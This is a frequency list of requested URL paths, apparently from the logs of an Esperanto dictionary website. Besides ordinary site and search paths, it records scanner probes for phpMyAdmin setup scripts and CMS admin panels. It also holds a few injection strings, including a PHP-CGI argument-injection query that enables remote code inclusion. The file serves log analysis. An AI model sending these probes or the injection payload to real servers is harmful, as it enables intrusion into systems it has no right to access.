Freq;Page
357;/apple-touch-icon-precomposed.png
246;/administrator/index.php
233;/cache/7c98c425e32af03fd6e78da12d7d49f4
224;/crossdomain.xml
192;/apple-touch-icon.png
140;/classes/){self.html(selector?jQuery(
115;/wp-login.php
71;/admin.php
53;/sitemap.xml
42;/ser%C4%89o/brava
42;/ser%C4%89o/gamo
41;/ser%C4%89o/vulgara
39;/undefined
38;/ser%C4%89o/planeo
36;/ser&
35;/ser%C4%89o/suferi
34;/ser%C4%89o
34;/ser%C4%89o/
32;/ser%C4%89o/-en-
30;/ser%C4%89o/forumo
30;/ser%C4%89o/kuko
30;/ser%C4%89o/perforti
28;/el%C5%9Duti/
28;/ser%C4%89o/Ne%C5%ADtono
28;/vortaro/
26;/check.htm?id=1b3cb64ad33846f19387b761ac056a7b
26;/wp-admin/
25;/ser%C4%89o/cirkvitkarto
18;//mc.yandex.ru/metrika/watch.js
18;//mc.yandex.ru/watch/1603051
18;/ser%C4%89o/kanzono
17;/administrator/
15;/ser%C4%89o/koncerni
14;/ser%C4%89o/femuro
13;/apple-touch-icon-114x114-precomposed.png
13;/apple-touch-icon-114x114.png
12;//wp-login.php
12;/blog//wp-login.php
12;/wordpress//wp-login.php
12;/wp//wp-login.php
11;/catalog/
11;/muieblackcat
11;/oscommerce/
11;/ser??o/brava
11;/shop
10;/?q=user
10;/admin/
10;/pri/3+%28%29
10;/ser
9;/netcat/admin/
8;/%7BHEADLINE%7D
8;//php-my-admin/index.php
8;/bitrix/admin/
8;/components/com_content/content.php
8;/forum/
8;/forum/viewtopic.php
8;/ser%C4%89o/imperativo
8;/ser%C4%89o/ne
8;/ser%C4%EF%BF%BDo/
7;/admin/content/sitetree/
7;/admin/index.php
7;/engine/engine.php
7;/ser%C3%84%E2%80%B0o
7;/ser%C4%89o/volitivo
7;/ser??o/gamo
6;//admin/pma/index.php
6;//admn/scripts/setup.php
6;//databaseadmin/scripts/setup.php
6;//db/scripts/setup.php
6;//dbadmin/scripts/setup.php
6;//myadmin/index.php
6;//mysql/scripts/setup.php
6;//phpMyAdmin-2.5.6/index.php
6;//phpMyAdmin-2.5.7/index.php
6;//phpMyAdmin-2.6.2-rc1/scripts/setup.php
6;//phpMyAdmin-2.6.3/scripts/setup.php
6;//phpmyadmin2/scripts/setup.php
6;//pma/scripts/setup.php
6;//web/index.php
6;//websql/scripts/setup.php
6;/bitrix/
6;/bitrix/js/main/core/core.css
6;/bitrix/themes/.default/adminstyles.css
6;/bitrix/themes/.default/images/auth_pict.gif
6;/configuration.php
6;/images/cms/admin/mac/common/butterfly.png
6;/media/system/js/mootools.js
6;/modules/system/system.base.css
6;/modules/system/system.css
6;/netcat/admin/skins/default/css/login.css
6;/netcat/admin/skins/default/css/style.css
6;/netcat/admin/skins/default/img/logo.png
6;/node/
6;/ser%C4%89o/je
6;/ser??o/vulgara
6;/serc.xo/perforti
6;/styles/skins/mac/design/css/style.css
6;/templates/system/css/system.css
6;/typo3/index.php
6;/user/login/
6;/user/password/
6;/users/forget/
6;/users/registrate/
6;/wp-admin/css/wp-admin.css
6;/wp-admin/images/wordpress-logo.png
6;/wp-content/
5;//admin/index.php
5;//admin/phpmyadmin/index.php
5;//db/index.php
5;//myadmin/scripts/setup.php
5;//mysql/index.php
5;//php-my-admin/scripts/setup.php
5;//phpadmin/index.php
5;//phpadmin/scripts/setup.php
5;//phpMyAdmin-2.5.1/index.php
5;//phpMyAdmin-2.5.5-rc2/index.php
5;//phpMyAdmin-2.5.6-rc1/index.php
5;//phpMyAdmin-2.5.7-pl1/index.php
5;//phpMyAdmin-2.8.1/scripts/setup.php
5;//phpMyAdmin-2.8.2/scripts/setup.php
5;//phpMyAdmin-2/scripts/setup.php
5;//phpmyadmin1/index.php
5;//phpmyadmin1/scripts/setup.php
5;//phpmyadmin2/index.php
5;//pma/index.php
5;//scripts/setup.php
5;//web/phpMyAdmin/index.php
5;//xampp/phpmyadmin/index.php
5;/?-s
5;/apanel/
5;/blocks/
5;/fpw.php
5;/gram/images/prepozicioj.png
5;/ipb/
5;/mc.yandex.ru/metrika/watch.js
5;/media.reformal.ru/widgets/v3/reformal.js
5;/ser%C4%89o/-n
5;/ser%C4%89o/kiel
5;/ser%C4%89o/pro
5;/ser?o/brava
5;/ser?o/gamo
5;/ser?o/vulgara
5;/templates/system/css/toolbar.css
5;/text/javascript
5;/vortaro.reformal.ru
5;/wp-content
5;/xmlrpc.php
4;/%5Bobject%20Object%5D://www.mytoolsapp.info/worker/init.js?b=2&l=0
4;//_admin/scripts/setup.php
4;//_phpmyadmin/scripts/setup.php
4;//admin/phpmyadmin/scripts/setup.php
4;//admin/pma/scripts/setup.php
4;//admin/scripts/setup.php
4;//admm/scripts/setup.php
4;//dbadmin/index.php
4;//mysql-admin/scripts/setup.php
4;//mysqlmanager/scripts/setup.php
4;//p/m/a/scripts/setup.php
4;//php-myadmin/scripts/setup.php
4;//phpmanager/scripts/setup.php
4;//phpmy-admin/scripts/setup.php
4;//phpmya/scripts/setup.php
4;//phpMyA/scripts/setup.php
4;//phpMyAdmin-2.2.3/index.php
4;//phpMyAdmin-2.2.3/scripts/setup.php
4;//phpMyAdmin-2.2.6/scripts/setup.php
4;//phpMyAdmin-2.5.1/scripts/setup.php
4;//phpMyAdmin-2.5.4/index.php
4;//phpMyAdmin-2.5.4/scripts/setup.php
4;//phpMyAdmin-2.5.5-pl1/scripts/setup.php
4;//phpMyAdmin-2.5.5-rc1/index.php
4;//phpMyAdmin-2.5.5-rc1/scripts/setup.php
4;//phpMyAdmin-2.5.5-rc2/scripts/setup.php
4;//phpMyAdmin-2.5.5/index.php
4;//phpMyAdmin-2.5.5/scripts/setup.php
4;//phpMyAdmin-2.5.6-rc1/scripts/setup.php
4;//phpMyAdmin-2.5.6-rc2/index.php
4;//phpMyAdmin-2.5.6-rc2/scripts/setup.php
4;//phpMyAdmin-2.5.6/scripts/setup.php
4;//phpMyAdmin-2.5.7-pl1/scripts/setup.php
4;//phpMyAdmin-2.5.7/scripts/setup.php
4;//phpMyAdmin-2.6.0-alpha/scripts/setup.php
4;//phpMyAdmin-2.6.0-alpha2/scripts/setup.php
4;//phpMyAdmin-2.6.0-beta1/scripts/setup.php
4;//phpMyAdmin-2.6.0-beta2/scripts/setup.php
4;//phpMyAdmin-2.6.0-pl1/scripts/setup.php
4;//phpMyAdmin-2.6.0-pl2/scripts/setup.php
4;//phpMyAdmin-2.6.0-pl3/scripts/setup.php
4;//phpMyAdmin-2.6.0-rc1/scripts/setup.php
4;//phpMyAdmin-2.6.0-rc2/scripts/setup.php
4;//phpMyAdmin-2.6.0-rc3/scripts/setup.php
4;//phpMyAdmin-2.6.0/scripts/setup.php
4;//phpMyAdmin-2.6.1-pl1/scripts/setup.php
4;//phpMyAdmin-2.6.1-pl2/scripts/setup.php
4;//phpMyAdmin-2.6.1-pl3/scripts/setup.php
4;//phpMyAdmin-2.6.1-rc1/scripts/setup.php
4;//phpMyAdmin-2.6.1-rc2/scripts/setup.php
4;//phpMyAdmin-2.6.1/scripts/setup.php
4;//phpMyAdmin-2.6.2-beta1/scripts/setup.php
4;//phpMyAdmin-2.6.2-pl1/scripts/setup.php
4;//phpMyAdmin-2.6.2/scripts/setup.php
4;//phpMyAdmin-2.6.3-pl1/scripts/setup.php
4;//phpMyAdmin-2.6.3-rc1/scripts/setup.php
4;//phpMyAdmin-2.6.4-pl1/scripts/setup.php
4;//phpMyAdmin-2.6.4-pl3/scripts/setup.php
4;//phpMyAdmin-2.6.4-pl4/scripts/setup.php
4;//phpMyAdmin-2.6.4-rc1/scripts/setup.php
4;//phpMyAdmin-2.6.4/scripts/setup.php
4;//phpMyAdmin-2.7.0-beta1/scripts/setup.php
4;//phpMyAdmin-2.7.0-pl1/scripts/setup.php
4;//phpMyAdmin-2.7.0-pl2/scripts/setup.php
4;//phpMyAdmin-2.7.0-rc1/scripts/setup.php
4;//phpMyAdmin-2.7.0/scripts/setup.php
4;//phpMyAdmin-2.8.0-beta1/scripts/setup.php
4;//phpMyAdmin-2.8.0-rc1/scripts/setup.php
4;//phpMyAdmin-2.8.0-rc2/scripts/setup.php
4;//phpMyAdmin-2.8.0.1/scripts/setup.php
4;//phpMyAdmin-2.8.0.2/scripts/setup.php
4;//phpMyAdmin-2.8.0.3/scripts/setup.php
4;//phpMyAdmin-2.8.0.4/scripts/setup.php
4;//phpMyAdmin-2.8.0/scripts/setup.php
4;//phpMyAdmin-2.8.1-rc1/scripts/setup.php
4;//phpMyAdmin-2/index.php
4;//pma2005/scripts/setup.php
4;//PMA2005/scripts/setup.php
4;//sqlmanager/scripts/setup.php
4;//sqlweb/scripts/setup.php
4;//typo3/phpmyadmin/index.php
4;//typo3/phpmyadmin/scripts/setup.php
4;//web/scripts/setup.php
4;//webadmin/scripts/setup.php
4;//webdb/scripts/setup.php
4;//websql/index.php
4;//xampp/phpmyadmin/scripts/setup.php
4;/?-n+-d+allow_url_include%3D1+-d+auto_prepend_file%3Dphp%3a%2f%2finput
4;/adm/
4;/administrator
4;/bitrix/admin/index.php
4;/controlpanel/
4;/cp/
4;/cpanel/
4;/engine/ajax/pm.php
4;/fckeditor/editor/images/anchor.gif
4;/forum/viewtopic.phpindex.php
4;/jsys.php
4;/ser%C3%84%E2%80%B0o/perforti
4;/ser%C4%89o/sana
4;/ser%C4%EF%BF%BDo/gamo
4;/ser??o/planeo
4;/ser?o/planeo
4;/serco/planeo
3;/%2BBoris
3;//_phpMyAdmin/scripts/setup.php
3;//Admin/scripts/setup.php
3;//phpAdmin/scripts/setup.php
3;//phpMyAdmin-2.11.1-all-languages/scripts/setup.php
3;//phpMyAdmin-2.11.1/scripts/setup.php
3;//phpMyAdmin-2.11.11-all-languages/scripts/setup.php
3;//phpMyAdmin-2.11.4/scripts/setup.php
3;//phpMyAdmin-2.11.9.4-all-languages/scripts/setup.php
3;//phpMyAdmin-2.2.6/index.php
3;//phpMyAdmin-2.5.5-pl1/index.php
3;//phpMyAdmin-2.6.4-pl2/scripts/setup.php
3;//phpMyAdmin-2.8.3/scripts/setup.php
3;//phpMyAdmin-2.9.1/scripts/setup.php
3;//pma2/scripts/setup.php
3;//pma3/scripts/setup.php
3;//sql/scripts/setup.php
3;//wp-phpmyadmin/phpmyadmin/scripts/setup.php
3;/?author=1
3;/++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++Result:+%F1%EA%F0%E8%EF%F2%EE%E7%E0%F9%E8%F2%E0+%E4%E5%F8%E8%F4%F0%EE%E2%E0%ED%E0;+%ED%E5+%ED%E0%F8%EB%EE%F1%FC+%F4%EE%F0%EC%FB+%E4%EB%FF+%EE%F2%EF%F0%E0%E2%EA%E8;
3;/blog/wp-login.php
3;/elsxuti/media.reformal.ru/widgets/v3/reformal.js
3;/FCKeditor/editor/images/anchor.gif
3;/gram/12/++++++++++++++++++++++++++++++++++++++++++++++++++++++++++Result:+%ED%E5+%ED%E0%F8%EB%EE%F1%FC+%F4%EE%F0%EC%FB+%E4%EB%FF+%EE%F2%EF%F0%E0%E2%EA%E8;
3;/gram/media.reformal.ru/widgets/v3/reformal.js
3;/info/media.reformal.ru/widgets/v3/reformal.js
3;/mc.yandex.ru/watch/1603051
3;/myadmin/
3;/pri/media.reformal.ru/widgets/v3/reformal.js
3;/ser%C4%EF%BF%BDo/-en-
3;/ser%C4%EF%BF%BDo/vulgara
3;/ser%D1%81xo/TEST
3;/sercho
3;/sercxo/media.reformal.ru/widgets/v3/reformal.js
3;/sercxo/stardict+mobi
3;/wp-includes/js/prototype.js
2;/&post=-38689454_25
2;//%0D/scripts/setup.php
2;//./scripts/setup.php
2;//_db/scripts/setup.php
2;//_dbadmin/scripts/setup.php
2;//_myphp/scripts/setup.php
2;//_php/scripts/setup.php
2;//_phpadmin/scripts/setup.php
2;//_pHpMyAdMiN/scripts/setup.php
2;//_PHPMYADMIN/scripts/setup.php
2;//_pma/scripts/setup.php
2;//_sql/scripts/setup.php
2;//~/phpmanager/scripts/setup.php
2;//3rdparty/phpMyAdmin/scripts/setup.php
2;//81/phpmyadmin/scripts/setup.php
2;//admin/myadmin/scripts/setup.php
2;//admin/mysql/scripts/setup.php
2;//Admin/phpmyadmin/scripts/setup.php
2;//Admin/phpMyAdmin/scripts/setup.php
2;//admin/phpMyAmdin/scripts/setup.php
2;//admin/sql/scripts/setup.php
2;//administrator/components/com_joommyadmin/phpmyadmin/scripts/setup.php
2;//adminmysql/scripts/setup.php
2;//apache-default/phpmyadmin/scripts/setup.php
2;//backup/phpmyadmin/scripts/setup.php
2;//backup/phpMyAdmin/scripts/setup.php
2;//bbs/data/scripts/setup.php
2;//bkup/phpmyadmin/scripts/setup.php
2;//bkup/phpMyAdmin/scripts/setup.php
2;//blog/phpmyadmin/scripts/setup.php
2;//cpadmin/scripts/setup.php
2;//cpadmindb/scripts/setup.php
2;//cpanelmysql/scripts/setup.php
2;//cpanelphpmyadmin/scripts/setup.php
2;//cpanelsql/scripts/setup.php
2;//cpdbadmin/scripts/setup.php
2;//cpphpmyadmin/scripts/setup.php
2;//database/scripts/setup.php
2;//dbAdmin2/scripts/setup.php
2;//forum/phpmyadmin/scripts/setup.php
2;//htdocs/scripts/setup.php
2;//httpdocs/scripts/setup.php
2;//myadmin/phpMyAdmin-2.11.9.6-all-languages/scripts/setup.php
2;//myAdmin/scripts/setup.php
2;//MyAdmin/scripts/setup.php
2;//mydatadmin/scripts/setup.php
2;//myphp/scripts/setup.php
2;//Myphp/scripts/setup.php
2;//mysql_administrator/scripts/setup.php
2;//MySQLAdmin/scripts/setup.php
2;//mysqladminconfig/scripts/setup.php
2;//padmin/scripts/setup.php
2;//php/phpmyadmin/scripts/setup.php
2;//php/scripts/setup.php
2;//phpas/scripts/setup.php
2;//phpdb/scripts/setup.php
2;//phpm/scripts/setup.php
2;//phpmy/scripts/setup.php
2;//pHpMy/scripts/setup.php
2;//phpmyad-sys/scripts/setup.php
2;//phpmyad/scripts/setup.php
2;//phpmyadm/scripts/setup.php
2;//phpMyAdmi/scripts/setup.php
2;//phpMyAdmin-2.10.0/scripts/setup.php
2;//phpMyAdmin-2.11.10/scripts/setup.php
2;//phpMyAdmin-2.11.2/scripts/setup.php
2;//phpMyAdmin-2.11.3-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.3/scripts/setup.php
2;//phpMyAdmin-2.11.4.0-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.4.0-english/scripts/setup.php
2;//phpMyAdmin-2.11.5.0-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.5.0-english/scripts/setup.php
2;//phpMyAdmin-2.11.5/scripts/setup.php
2;//phpMyAdmin-2.11.6.0-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.6.0-english/scripts/setup.php
2;//phpMyAdmin-2.11.6/scripts/setup.php
2;//phpMyAdmin-2.11.7.0-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.7.0-english/scripts/setup.php
2;//phpMyAdmin-2.11.7.1-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.7.1-english/scripts/setup.php
2;//phpMyAdmin-2.11.7/scripts/setup.php
2;//phpMyAdmin-2.11.8.0-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.8.0-english/scripts/setup.php
2;//phpMyAdmin-2.11.8.1-all-languages-utf-8-only/scripts/setup.php
2;//phpMyAdmin-2.11.8/scripts/setup.php
2;//phpMyAdmin-2.11.9.0-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.9.0-english/scripts/setup.php
2;//phpMyAdmin-2.11.9.1-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.9.1-english/scripts/setup.php
2;//phpMyAdmin-2.11.9.2-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.9.2-english/scripts/setup.php
2;//phpMyAdmin-2.11.9.3-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.9.3-english/scripts/setup.php
2;//phpMyAdmin-2.11.9.4-english/scripts/setup.php
2;//phpMyAdmin-2.11.9.5-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.9/scripts/setup.php
2;//phpMyAdmin-2.3.0/scripts/setup.php
2;//phpMyAdmin-2.3.1/scripts/setup.php
2;//phpMyAdmin-2.3.2/scripts/setup.php
2;//phpMyAdmin-2.3.3/scripts/setup.php
2;//phpMyAdmin-2.3.4/scripts/setup.php
2;//phpMyAdmin-2.3.5/scripts/setup.php
2;//phpMyAdmin-2.3.6/scripts/setup.php
2;//phpMyAdmin-2.3.7/scripts/setup.php
2;//phpMyAdmin-2.3.8/scripts/setup.php
2;//phpMyAdmin-2.3.9/scripts/setup.php
2;//phpMyAdmin-2.4.0/scripts/setup.php
2;//phpMyAdmin-2.4.1/scripts/setup.php
2;//phpMyAdmin-2.4.2/scripts/setup.php
2;//phpMyAdmin-2.4.3/scripts/setup.php
2;//phpMyAdmin-2.4.4/scripts/setup.php
2;//phpMyAdmin-2.4.5/scripts/setup.php
2;//phpMyAdmin-2.4.6/scripts/setup.php
2;//phpMyAdmin-2.4.7/scripts/setup.php
2;//phpMyAdmin-2.4.8/scripts/setup.php
2;//phpMyAdmin-2.4.9/scripts/setup.php
2;//phpMyAdmin-2.5.0/scripts/setup.php
2;//phpMyAdmin-2.5.2/scripts/setup.php
2;//phpMyAdmin-2.5.3/scripts/setup.php
2;//phpMyAdmin-2.5.5-rc1config/scripts/setup.php
2;//phpMyAdmin-2.5.8/scripts/setup.php
2;//phpMyAdmin-2.5.9/scripts/setup.php
2;//phpMyAdmin-2.6.3/
2;//phpMyAdmin-2.6.5/scripts/setup.php
2;//phpMyAdmin-2.6.6/scripts/setup.php
2;//phpMyAdmin-2.6.7/scripts/setup.php
2;//phpMyAdmin-2.6.8/scripts/setup.php
2;//phpMyAdmin-2.6.9/scripts/setup.php
2;//phpMyAdmin-2.7.1/scripts/setup.php
2;//phpMyAdmin-2.7.2/scripts/setup.php
2;//phpMyAdmin-2.7.3/scripts/setup.php
2;//phpMyAdmin-2.7.4/scripts/setup.php
2;//phpMyAdmin-2.7.5/scripts/setup.php
2;//phpMyAdmin-2.7.6/scripts/setup.php
2;//phpMyAdmin-2.7.7/scripts/setup.php
2;//phpMyAdmin-2.7.8/scripts/setup.php
2;//phpMyAdmin-2.7.9/scripts/setup.php
2;//phpMyAdmin-2.8.4/scripts/setup.php
2;//phpMyAdmin-2.8.5/scripts/setup.php
2;//phpMyAdmin-2.8.6/scripts/setup.php
2;//phpMyAdmin-2.8.7/scripts/setup.php
2;//phpMyAdmin-2.8.8/scripts/setup.php
2;//phpMyAdmin-2.8.9/scripts/setup.php
2;//phpMyAdmin-2.9.2/scripts/setup.php
2;//phpMyAdmin-3.0.0-rc1-english/scripts/setup.php
2;//phpMyAdmin-3.0.0.0-all-languages/scripts/setup.php
2;//phpMyAdmin-3.0.0.0-english/scripts/setup.php
2;//phpMyAdmin-3.0.1.0-all-languages/scripts/setup.php
2;//phpMyAdmin-3.0.1.0-english/scripts/setup.php
2;//phpMyAdmin-3.1.0.0-all-languages/scripts/setup.php
2;//phpMyAdmin-3.1.0.0-english/scripts/setup.php
2;//phpMyAdmin-3.1.1.0-all-languages/scripts/setup.php
2;//phpMyAdmin-3.1.1.0-english/scripts/setup.php
2;//phpMyAdmin-3.1.2.0-all-languages/scripts/setup.php
2;//phpMyAdmin-3.1.2.0-english/scripts/setup.php
2;//phpMyAdmin-3.1.3.0-all-languages/scripts/setup.php
2;//phpMyAdmin-3.1.3.0-english/scripts/setup.php
2;//phpMyAdmin-3/scripts/setup.php
2;//phpMyAdmin-4/scripts/setup.php
2;//phpmyadmin.old/scripts/setup.php
2;//pHpMyAdMiN/scripts/setup.php
2;//PHPMYADMIN/scripts/setup.php
2;//phpMyAdmin1/scripts/setup.php
2;//phpMyAdmin2/scripts/setup.php
2;//phpmyadmin3/scripts/setup.php
2;//phpMyAdmin3/scripts/setup.php
2;//phpMyAds/scripts/setup.php
2;//pma/%20/scripts/setup.php
2;//pMA/scripts/setup.php
2;//PMA/scripts/setup.php
2;//pma_mydb/scripts/setup.php
2;//PMA2/scripts/setup.php
2;//pma2009/scripts/setup.php
2;//PMA2009/scripts/setup.php
2;//PMA3/scripts/setup.php
2;//pmadmin/scripts/setup.php
2;//roundcube/scripts/setup.php
2;//sl2/data/scripts/setup.php
2;//sql/phpmyadmin/scripts/setup.php
2;//sql/phpMyAdmin/scripts/setup.php
2;//SQL/scripts/setup.php
2;//sqladm.old/scripts/setup.php
2;//sqladmin/scripts/setup.php
2;//SSLMySQLAdmin/scripts/setup.php
2;//vhcs2/tools/pma/scripts/setup.php
2;//web/phpmyadmin/scripts/setup.php
2;//web/phpMyAdmin/scripts/setup.php
2;//webmail2/scripts/setup.php
2;//wp-content/plugins/wp-phpmyadmin/wp-phpmyadmin/phpmyadmin/scripts/setup.php
2;//wp-phpmyadmin/scripts/setup.php
2;/?action=add
2;/?e=phpinfo();
2;/?q=admin
2;/1.2.6
2;/404javascript.js
2;/404testpage4525d2fdc
2;/about
2;/about.php
2;/admin/fckeditor/editor/images/anchor.gif
2;/admin/FCKeditor/editor/images/anchor.gif
2;/admin/login.php
2;/apple-touch-icon-72x72-precomposed.png
2;/apple-touch-icon-72x72.png
2;/application/x-www-form-urlencoded
2;/bots.all
2;/contact
2;/contacts
2;/elsxuti/text/javascript
2;/elŝuti/
2;/gram/index.php
2;/help.html
2;/images/aleks.jpg
2;/images/boris.jpg
2;/images/igor.jpg
2;/info/mailto:[email]?subject=Letero%20de%20la%20vortara%20pagxaro%20por%20Aleks
2;/info/mailto:[email]?subject=Letero%20de%20la%20vortara%20pagxaro%20por%20la%20auxtoro
